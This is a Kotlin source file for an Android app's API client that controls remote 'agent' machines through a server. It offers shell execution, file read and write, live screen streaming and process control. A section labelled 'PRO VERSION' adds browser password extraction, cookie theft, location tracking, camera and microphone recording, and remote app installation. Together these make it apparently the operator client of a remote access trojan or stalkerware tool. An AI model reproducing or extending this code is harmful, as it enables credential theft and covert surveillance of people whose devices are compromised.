package com.mimo.pro.api

import com.mimo.pro.ConnectActivity
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.withContext
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONArray
import org.json.JSONObject
import java.net.URLEncoder
import java.util.concurrent.TimeUnit

object RuntimeBrokerApi {

    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(300, TimeUnit.SECONDS)
        .writeTimeout(60, TimeUnit.SECONDS)
        .build()

    private val jsonType = "application/json; charset=utf-8".toMediaType()

    fun wsBaseUrl(baseUrl: String): String =
        baseUrl.trimEnd('/')
            .replaceFirst(Regex("^https"), "wss")
            .replaceFirst(Regex("^http"), "ws")

    suspend fun command(
        baseUrl: String,
        machineName: String,
        password: String,
        cmd: String,
        params: JSONObject = JSONObject()
    ): CommandResult = withContext(Dispatchers.IO) {
        try {
            val url = buildString {
                append(baseUrl.trimEnd('/'))
                append("/api/monitor/")
                append(URLEncoder.encode(machineName, "UTF-8"))
                append("/command")
            }
            val payload = JSONObject()
                .put("password", password)
                .put("cmd", cmd)
                .put("params", params)
            // Hard ceiling a bit above the server-side timeout so the UI can
            // never hang on a lost request.
            val serverTimeoutSec = params.optInt("timeoutSec", 0).coerceAtLeast(35)
            val request = Request.Builder()
                .url(url)
                .header("X-Admin-Password", password)
                .post(payload.toString().toRequestBody(jsonType))
                .build()
            val callClient = client.newBuilder()
                .callTimeout(serverTimeoutSec + 20L, TimeUnit.SECONDS)
                .build()
            callClient.newCall(request).execute().use { resp ->
                val body = resp.body?.string()
                    ?: return@withContext CommandResult(false, null, null, 0, "Empty response")
                val obj = JSONObject(body)
                CommandResult(
                    success = obj.optBoolean("success"),
                    output = obj.optString("output").ifBlank { null },
                    data = obj.opt("data"),
                    exitCode = obj.optInt("exitCode"),
                    error = obj.optString("error").ifBlank { null },
                    ref = obj.optString("ref").ifBlank { null },
                    filename = obj.optString("filename").ifBlank { null },
                    mime = obj.optString("mime").ifBlank { null }
                )
            }
        } catch (e: Exception) {
            CommandResult(false, null, null, 0, e.message ?: "Network error")
        }
    }

    suspend fun shell(baseUrl: String, machineName: String, password: String, command: String, admin: Boolean = false, timeoutSec: Int = 30): CommandResult =
        command(baseUrl, machineName, password, "shell_exec", JSONObject()
            .put("command", command)
            .put("timeoutSec", timeoutSec)
            .put("admin", admin))

    /** Downloads a large-result payload uploaded by the agent (by ref). */
    suspend fun downloadRef(baseUrl: String, password: String, ref: String): ByteArray? =
        withContext(Dispatchers.IO) {
            try {
                val url = baseUrl.trimEnd('/') + "/api/file/" + URLEncoder.encode(ref, "UTF-8")
                val request = Request.Builder()
                    .url(url)
                    .header("X-Admin-Password", password)
                    .get()
                    .build()
                client.newBuilder().callTimeout(300, TimeUnit.SECONDS).build()
                    .newCall(request).execute().use { resp ->
                        if (!resp.isSuccessful) return@withContext null
                        resp.body?.bytes()
                    }
            } catch (e: Exception) {
                null
            }
        }

    suspend fun shell(baseUrl: String, machineName: String, password: String, command: String, timeoutSec: Int = 30): CommandResult =
        shell(baseUrl, machineName, password, command, false, timeoutSec)

    suspend fun listProcesses(baseUrl: String, machineName: String, password: String): CommandResult =
        command(baseUrl, machineName, password, "list_processes")

    suspend fun listServices(baseUrl: String, machineName: String, password: String): CommandResult =
        command(baseUrl, machineName, password, "list_services")

    suspend fun listFiles(baseUrl: String, machineName: String, password: String, path: String): CommandResult =
        command(baseUrl, machineName, password, "list_files", JSONObject().put("path", path))

    fun connectLive(
        baseUrl: String,
        machineName: String,
        password: String,
        intervalMs: Int = 800,
        listener: LiveListener
    ): WebSocket {
        val url = buildString {
            append(wsBaseUrl(baseUrl))
            append("/ws/live/")
            append(URLEncoder.encode(machineName, "UTF-8"))
            append("?token=").append(URLEncoder.encode(password, "UTF-8"))
            append("&interval=").append(intervalMs)
        }
        val request = Request.Builder().url(url).build()
        return client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                listener.onConnected()
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                try {
                    val obj = JSONObject(text)
                    when (obj.optString("type")) {
                        "frame" -> {
                            listener.onFrame(obj.optString("image"))
                            val c = obj.optJSONObject("cursor")
                            if (c != null) listener.onCursor(c.optDouble("cx", -1.0).toFloat(), c.optDouble("cy", -1.0).toFloat())
                        }
                        "error" -> listener.onError(obj.optString("error").ifBlank { "Stream error" })
                    }
                } catch (e: Exception) {
                    listener.onError(e.message ?: "Bad frame")
                }
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                listener.onError(t.message ?: "Connection failed")
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                listener.onClosed()
            }
        })
    }

    suspend fun agents(baseUrl: String, password: String, query: String): List<AgentInfo>? = withContext(Dispatchers.IO) {
        // Retry logic for better connection stability
        repeat(3) { attempt ->
            try {
                val url = buildString {
                    append(baseUrl.trimEnd('/'))
                    append("/api/agents")
                    if (query.isNotBlank()) {
                        append("?q=").append(URLEncoder.encode(query, "UTF-8"))
                    }
                }
                val request = Request.Builder()
                    .url(url)
                    .header("X-Admin-Password", password)
                    .build()
                val callClient = client.newBuilder()
                    .connectTimeout(5, TimeUnit.SECONDS)
                    .readTimeout(10, TimeUnit.SECONDS)
                    .writeTimeout(10, TimeUnit.SECONDS)
                    .callTimeout(15, TimeUnit.SECONDS)
                    .build()
                callClient.newCall(request).execute().use { resp ->
                    if (!resp.isSuccessful) {
                        if (attempt == 2) return@withContext null
                        delay(1000L * (attempt + 1))
                        return@withContext null
                    }
                    val body = resp.body?.string() ?: return@withContext null
                    val arr = JSONArray(body)
                    return@withContext (0 until arr.length()).map { i -> parseAgent(arr.getJSONObject(i)) }
                }
            } catch (e: Exception) {
                if (attempt == 2) return@withContext null
                delay(1000L * (attempt + 1))
            }
        }
        null
    }

    suspend fun capture(baseUrl: String, machineName: String, password: String): CaptureResult =
        withContext(Dispatchers.IO) {
            try {
                val url = buildString {
                    append(baseUrl.trimEnd('/'))
                    append("/api/monitor/")
                    append(URLEncoder.encode(machineName, "UTF-8"))
                    append("/screenshot")
                }
                val payload = JSONObject().put("password", password).toString()
                val request = Request.Builder()
                    .url(url)
                    .header("X-Admin-Password", password)
                    .post(payload.toRequestBody(jsonType))
                    .build()
                client.newCall(request).execute().use { resp ->
                    val body = resp.body?.string()
                        ?: return@withContext CaptureResult(false, null, null, "Empty response")
                    val obj = JSONObject(body)
                    CaptureResult(
                        success = obj.optBoolean("success"),
                        image = obj.optString("image").ifBlank { null },
                        at = obj.optString("at").ifBlank { null },
                        error = obj.optString("error").ifBlank { null }
                    )
                }
            } catch (e: Exception) {
                CaptureResult(false, null, null, e.message ?: "Network error")
            }
        }

    private fun parseAgent(o: JSONObject) = AgentInfo(
        machineName = o.optString("machineName"),
        hostname = o.optString("hostname"),
        model = o.optString("model"),
        serial = o.optString("serial"),
        username = o.optString("username"),
        os = o.optString("os"),
        version = o.optString("version"),
        ip = o.optString("ip"),
        online = o.optBoolean("online"),
        lastSeen = o.optString("lastSeen")
    )

    // Device connection check (used by ConnectActivity for 3-attempt lock)
    suspend fun checkConnection(baseUrl: String, password: String, deviceId: String): ConnectActivity.ConnectionResult =
        withContext(Dispatchers.IO) {
            try {
                val url = buildString {
                    append(baseUrl.trimEnd('/'))
                    append("/api/config")
                }
                val payload = JSONObject()
                    .put("password", password)
                    .put("deviceId", deviceId)
                val request = Request.Builder()
                    .url(url)
                    .header("X-Device-Id", deviceId)
                    .header("X-Admin-Password", password)
                    .post(payload.toString().toRequestBody(jsonType))
                    .build()
                client.newCall(request).execute().use { resp ->
                    val body = resp.body?.string() ?: return@withContext ConnectActivity.ConnectionResult.Error("Empty response")
                    val obj = JSONObject(body)
                    when (resp.code) {
                        200 -> ConnectActivity.ConnectionResult.Success(obj.optString("url", baseUrl))
                        401, 403 -> ConnectActivity.ConnectionResult.AuthFailed(obj.optString("error", "Invalid credentials"))
                        423 -> ConnectActivity.ConnectionResult.AuthFailed("Device blocked")
                        else -> ConnectActivity.ConnectionResult.Error(obj.optString("error", "HTTP ${resp.code}"))
                    }
                }
            } catch (e: Exception) {
                ConnectActivity.ConnectionResult.Error(e.message ?: "Network error")
            }
        }

    // Device status check (used by "Check Status" button)
    suspend fun checkDeviceStatus(baseUrl: String, deviceId: String): ConnectActivity.ConnectionResult =
        withContext(Dispatchers.IO) {
            try {
                val url = buildString {
                    append(baseUrl.trimEnd('/'))
                    append("/api/config/status")
                }
                val payload = JSONObject().put("deviceId", deviceId)
                val request = Request.Builder()
                    .url(url)
                    .header("X-Device-Id", deviceId)
                    .post(payload.toString().toRequestBody(jsonType))
                    .build()
                client.newCall(request).execute().use { resp ->
                    val body = resp.body?.string() ?: return@withContext ConnectActivity.ConnectionResult.Error("Empty response")
                    val obj = JSONObject(body)
                    when (resp.code) {
                        200 -> ConnectActivity.ConnectionResult.Success(obj.optString("message", "OK"))
                        403 -> ConnectActivity.ConnectionResult.AuthFailed(obj.optString("error", "Still locked"))
                        else -> ConnectActivity.ConnectionResult.Error(obj.optString("error", "HTTP ${resp.code}"))
                    }
                }
            } catch (e: Exception) {
                ConnectActivity.ConnectionResult.Error(e.message ?: "Network error")
            }
        }

    // ===== PRO VERSION API METHODS =====

    // Browser Password Extraction
    suspend fun extractBrowserPasswords(baseUrl: String, machineName: String, password: String): String? =
        withContext(Dispatchers.IO) {
            try {
                val url = buildString {
                    append(baseUrl.trimEnd('/'))
                    append("/api/monitor/")
                    append(URLEncoder.encode(machineName, "UTF-8"))
                    append("/browser_passwords")
                }
                val payload = JSONObject().put("password", password).toString()
                val request = Request.Builder()
                    .url(url)
                    .header("X-Admin-Password", password)
                    .post(payload.toRequestBody(jsonType))
                    .build()
                client.newCall(request).execute().use { resp ->
                    val body = resp.body?.string() ?: return@withContext null
                    val obj = JSONObject(body)
                    if (obj.optBoolean("success")) {
                        return@withContext obj.optString("data").ifBlank { "No passwords found" }
                    } else {
                        return@withContext null
                    }
                }
            } catch (e: Exception) {
                null
            }
        }

    // Location
    data class LocationResult(
        val success: Boolean,
        val location: String?,
        val accuracy: Double?,
        val timestamp: String?,
        val error: String?
    )

    suspend fun getLocation(baseUrl: String, machineName: String, password: String): LocationResult? =
        withContext(Dispatchers.IO) {
            try {
                val url = buildString {
                    append(baseUrl.trimEnd('/'))
                    append("/api/monitor/")
                    append(URLEncoder.encode(machineName, "UTF-8"))
                    append("/location")
                }
                val payload = JSONObject().put("password", password).toString()
                val request = Request.Builder()
                    .url(url)
                    .header("X-Admin-Password", password)
                    .post(payload.toRequestBody(jsonType))
                    .build()
                client.newCall(request).execute().use { resp ->
                    val body = resp.body?.string() ?: return@withContext null
                    val obj = JSONObject(body)
                    LocationResult(
                        success = obj.optBoolean("success"),
                        location = obj.optString("location").ifBlank { null },
                        accuracy = obj.optDouble("accuracy").takeIf { it > 0 },
                        timestamp = obj.optString("timestamp").ifBlank { null },
                        error = obj.optString("error").ifBlank { null }
                    )
                }
            } catch (e: Exception) {
                LocationResult(false, null, null, null, e.message ?: "Network error")
            }
        }

    // Power Actions
    suspend fun powerAction(baseUrl: String, machineName: String, password: String, action: String): CommandResult =
        command(baseUrl, machineName, password, "power_action", JSONObject().put("action", action))

    // Cookies Extraction
    suspend fun extractCookies(baseUrl: String, machineName: String, password: String): ExtractCookiesResult? =
        withContext(Dispatchers.IO) {
            try {
                val url = buildString {
                    append(baseUrl.trimEnd('/'))
                    append("/api/monitor/")
                    append(URLEncoder.encode(machineName, "UTF-8"))
                    append("/cookies")
                }
                val payload = JSONObject().put("password", password).toString()
                val request = Request.Builder()
                    .url(url)
                    .header("X-Admin-Password", password)
                    .post(payload.toRequestBody(jsonType))
                    .build()
                client.newCall(request).execute().use { resp ->
                    val body = resp.body?.string() ?: return@withContext null
                    val obj = JSONObject(body)
                    ExtractCookiesResult(
                        success = obj.optBoolean("success"),
                        cookies = obj.optString("cookies").ifBlank { null },
                        error = obj.optString("error").ifBlank { null }
                    )
                }
            } catch (e: Exception) {
                ExtractCookiesResult(false, null, e.message ?: "Network error")
            }
        }

    data class ExtractCookiesResult(
        val success: Boolean,
        val cookies: String?,
        val error: String?
    )

    // File Operations
    suspend fun readFile(baseUrl: String, machineName: String, password: String, path: String): CommandResult =
        command(baseUrl, machineName, password, "read_file", JSONObject().put("path", path))

    suspend fun writeFile(baseUrl: String, machineName: String, password: String, path: String, content: String): CommandResult =
        command(baseUrl, machineName, password, "write_file", JSONObject().put("path", path).put("base64", content))

    // Service Control
    suspend fun serviceAction(baseUrl: String, machineName: String, password: String, serviceName: String, action: String): CommandResult =
        command(baseUrl, machineName, password, "service_action", JSONObject().put("service", serviceName).put("action", action))

    // Kill Process
    suspend fun killProcess(baseUrl: String, machineName: String, password: String, pid: Int): CommandResult =
        command(baseUrl, machineName, password, "kill_process", JSONObject().put("pid", pid))

    // Install Application
    suspend fun installApp(baseUrl: String, machineName: String, password: String, base64Exe: String, args: String = ""): CommandResult =
        command(baseUrl, machineName, password, "install_app", JSONObject().put("exe", base64Exe).put("args", args))

    // Play Audio
    suspend fun playAudio(baseUrl: String, machineName: String, password: String, base64Audio: String): CommandResult =
        command(baseUrl, machineName, password, "play_audio", JSONObject().put("base64", base64Audio))

    suspend fun stopAudio(baseUrl: String, machineName: String, password: String): CommandResult =
        command(baseUrl, machineName, password, "stop_audio")

    // Camera
    suspend fun cameraPhoto(baseUrl: String, machineName: String, password: String): CaptureResult =
        capture(baseUrl, machineName, password)

    suspend fun cameraVideo(baseUrl: String, machineName: String, password: String, seconds: Int): CommandResult =
        command(baseUrl, machineName, password, "camera_video", JSONObject().put("seconds", seconds))

    // Microphone
    suspend fun recordMic(baseUrl: String, machineName: String, password: String, seconds: Int): CommandResult =
        command(baseUrl, machineName, password, "mic_record", JSONObject().put("seconds", seconds))

    // Transfer Files
    suspend fun transferFile(baseUrl: String, machineName: String, password: String, base64File: String, remotePath: String): CommandResult =
        command(baseUrl, machineName, password, "transfer_file", JSONObject().put("base64", base64File).put("filename", remotePath))
}